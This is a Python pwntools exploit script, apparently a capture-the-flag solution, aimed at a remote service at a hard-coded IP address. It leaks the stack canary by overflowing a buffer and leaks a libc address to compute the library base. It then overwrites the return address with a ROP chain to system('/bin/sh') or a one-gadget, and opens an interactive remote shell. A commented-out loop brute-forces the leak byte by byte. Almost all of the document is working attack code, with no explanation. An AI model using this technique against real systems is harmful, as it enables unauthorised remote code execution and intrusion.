from pwn import *
p=remote("101.71.29.5",10000)
p.recv()
p.send("A"*57)
data= p.recv()
sg=((u64(data[56:64])&0xFFFFFFFFFFFFFF00))
log.info("canary=====================>%s",hex(sg))
p.recv()
leak=""
i=2;
p.send("A"*56+"B"*(17))
data=p.recv()[56+17:]
leak=""
for x in data:
	tmp=hex(ord(x[:1]))
	if(len(tmp)==4):
		leak=tmp[-2:]+leak
	if(len(tmp)==3):
		leak="0"+tmp[-1:]+leak
leak="0x"+leak+"30"
leak=int(leak,16)
#print hex(leak)
libc=ELF("./zz.so")
print hex(libc.symbols['__libc_start_main'])
base= (leak-(0x20830-0x20740))-libc.symbols['__libc_start_main']
#print hex(base)
libc.address=base;
fk=base+0x0000000000021102
bash= libc.search('/bin/sh').next()
payload="A"*56+p64(sg)+"AAAAAAAA"+p64(fk)+p64(bash)+p64(libc.symbols['system'])
payload="A"*56+p64(sg)+"AAAAAAAA"+p64(base+0x45216)
if '\x0a' in payload:
	print "GG"
p.send(payload)
p.interactive();
'''
while(1):
	p.send("A"*56+"B"*i)
	data=p.recv()
	z=data[56+i:]
	if(len(z)==0):
		leak='00'+leak;
	else:
		tmp=hex(ord(z[:1]))
		if(len(tmp)==4):
			leak=tmp[-2:]+leak
		if(len(tmp)==3):
			leak="0"+tmp[-1:]+leak
	#print leak;
	if(len(leak)==16):
		print i
		log.info("leak=====================>%s",hex(int("0x"+leak,16)))
		leak=""
	if(i==7):
		leak=""
	
	i+=1;
	p.recv();
#print len(z)
'''



















